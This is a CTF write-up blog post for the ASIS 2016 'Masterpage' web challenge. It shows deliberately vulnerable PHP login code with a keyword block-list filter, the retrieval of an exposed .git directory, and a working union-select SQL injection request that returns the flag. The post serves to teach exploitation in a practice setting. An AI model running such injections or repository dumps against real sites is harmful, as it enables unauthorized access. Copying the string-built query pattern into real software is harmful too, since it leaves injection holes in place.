---
layout: post
title: ASIS CTF Quals 2016 Masterpage Writeup
tags: CTF, ASIS, SQLi
---

![][img1]

This challenge presented a web page with a form upon dry submission of which it would return text "Blocked". Good start. Quickly poking around I discovered a Git directory (just a second step after checking *robots.txt*, you know) under `/.git` and retrieved the Git repository with [DVCS Ripper](https://github.com/kost/dvcs-ripper). 

Found only *index.php* in the master branch under current revision. Additionally, checked out the HEAD~3 revision to get the *query.php* and *config.php* with the following contents respectively:

**index.php:**

~~~ php
<?php
    error_reporting(7);

    /* create table admin(id varchar(255), pw varchar(255), ip varchar(255)); */
    /* get flag */
    require('config.php');
    global $mysql;

    $id = $mysql->filter($_POST['user'], "auth");
    $pw = $mysql->filter($_POST['pass'], "pass");
    $ip = $mysql->filter($_SERVER['REMOTE_ADDR'], "hash");

    /* resolve ip addr. */
    $dns = dns_get_record(gethostbyaddr($ip));
    $ip = ($dns) ? print_r($dns, true) : ($ip);

    /* mysql filtration */
    $filter = "_|information|schema|con|\_|ha|b|x|f|@|'|\"|`|admin|cas|txt|sleep|benchmark|procedure|\^";
    foreach($_POST as $_VAR){
        if(preg_match("/{$filter}/i", $_VAR) || preg_match("/{$filter}/i", $ip))
        {
            exit("Blocked!");
        }
    }
    if(strlen($id.$pw.$ip) >= 200 || substr_count("(", $id.$pw.$ip) > 2)
    {
        exit("Too Long!");
    }

    /* admin auth */
    $query = "SELECT id, pw FROM admin WHERE id='{$id}' AND pw='{$pw}' AND ip='{$ip}';";
    $result = $mysql->query($query, 1);
    if($result['id'] === "admin" && $result['pw'] === $_POST['pw'])
    {
        echo $flag."<HR>";
    }

    echo "<HR>";
    echo "<h1>Please login.</h1><form method=POST><input type=text placeholder=username name=user>&nbsp;<input type=password placeholder=password name=pass><input type=submit name=submit>";
    echo "<HR>";

    //highlight_file(__FILE__);
?>
~~~

**query.php:**

~~~ php
<?php
    error_reporting(0);
    if(__CHECK_INTERNAL__ == False) die();
    // SQL Query Selector for PHP5/PHP7, Who cares if it's vulnerable? \o/
    class Query{
        private $conn, $mysqli;
        function check(){
            return ($this->conn) ? True : False;
        }
        function connect($host, $username, $password, $db=""){
            // @return //
            if($this->mysqli){
                $this->conn = mysqli_connect($host, $username, $password, $db);
                if(!$this->conn) return mysqli_connect_errno();
            }else{
                $this->conn = mysql_connect($host, $username, $password);
                mysql_select_db($db, $this->conn);
                if(!$this->conn) return mysql_error();
            }
        }
        function query($query, $result=0){
            // $result: 0 -> no return, 1 -> return_assoc, 2 -> return_array
            if(!$this->conn) return false;
            if($this->mysqli){
                $_query = mysqli_query($this->conn, $query);
                if(!$_query) return false;
                switch($result){
                    case 2:
                        $_result = Array();
                        while($_result_temp = mysqli_fetch_array($_query)){
                            $_result[] = $_result_temp;
                        }
                        return $_result;
                    case 1:
                        return mysqli_fetch_assoc($_query);
                    default:
                        return true;
                }
            }else{
                $_query = mysql_query($query, $this->conn);
                if(!$_query) return false;
                switch($result){
                    case 2:
                        $_result = Array();
                        while($_result_temp = mysql_fetch_array($_query, MYSQL_ASSOC)){
                            $_result[] = $_result_temp;
                        }
                        return $_result;
                    case 1:
                        return mysql_fetch_assoc($_query);
                    default:
                        return true;
                }
            }
        }
        function filter($str, $type='sql'){
            switch($type){
                case "url":
                    return preg_replace("/[^a-zA-Z0-9-_&\/]/", "", $str);
                case "sql":
                    if($this->conn){
                        $_filter = preg_replace("/[^a-zA-Z0-9-_!@#$.%^+&*(){}]/", "", $str);
                        if($this->mysqli){
                            return mysqli_real_escape_string($this->conn, $_filter);
                        }else{
                            return mysql_real_escape_string($_filter, $this->conn);
                        }
                    }
                case "memo":
                    if($this->conn){
                        $_filter = htmlspecialchars(preg_replace("/[^a-zA-Z0-9-_:+!@#$.%^&*(){}:\/.\ <>]/", "", $str));
                        if($this->mysqli){
                            return mysqli_real_escape_string($this->conn, $_filter);
                        }else{
                            return mysql_real_escape_string($_filter, $this->conn);
                        }
                    }
                case "auth":
                    return preg_replace("/[^a-zA-Z0-9-_!@#$.%^&*()\\]/", "", $str);
            }
            return $str;
        }
        function __construct(){
            if(function_exists("mysqli_connect")){
                $this->mysqli = true;
            }else{
                $this->mysqli = false;
            }
        }
        function __destruct(){
            if($this->conn){
                if($this->mysqli){
                    mysqli_close($this->conn);
                }else{
                    mysql_close($this->conn);
                }
            }
        }
    }
?>
~~~


**config.php:**

~~~ php

<?php

require("query.php");

$mysql = new Query();
$mysql->connect("localhost", "admin", "admin", "admin");
if($mysql->check() === false) die("Server dead, contact acid.");

$flag = "..";

?>

~~~

After static analysis of the code above I had two spots in mind that I could run SQLi through:

* TXT record on my domain with SQLi inside so that the SQL query would look like `SELECT id, pw FROM admin WHERE id='zzz' AND pw='zzz' AND ip='TXT record stuff' union select 'admin', NULL or 'aaa'=' TXT record continued';`
* The check in the **index.php** file is seemingly erroneous as it checks for `$_POST['pw']` rather than `$pw` logically: ``` if($result['id'] === "admin" && $result['pw'] === $_POST['pw']) ```

I didn't want to mess with my domain and didn't actually think it would be quick for me. Luckily, an unexpected update to the challenge made things super-easy: copied the Git repository over again to find out that the filter was alleviated to allow single quotes:

~~~
$filter = "_|information|schema|con|\_|ha|b|x|f|@|\"|`|admin|cas|txt|sleep|benchmark|procedure|\^";
~~~

In the light of this change things became elementary. Final payload:

~~~ http

POST / HTTP/1.0
Host: masterpage.asis-ctf.ir
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=dude&pass=' union select 'adm'+'in','pass' -- -&pw=pass
~~~

Response:

~~~
...

ASIS{6dcb302a3ad0501bcc3c2880b9aec3fc}<HR><HR><h1>Please login.</h1><form method=POST><input type=text placeholder=username name=user>&nbsp;<input type=password placeholder=password name=pass><input type=submit name=submit><HR>
~~~

[img1]: http://i.imgur.com/7CbwwMK.png
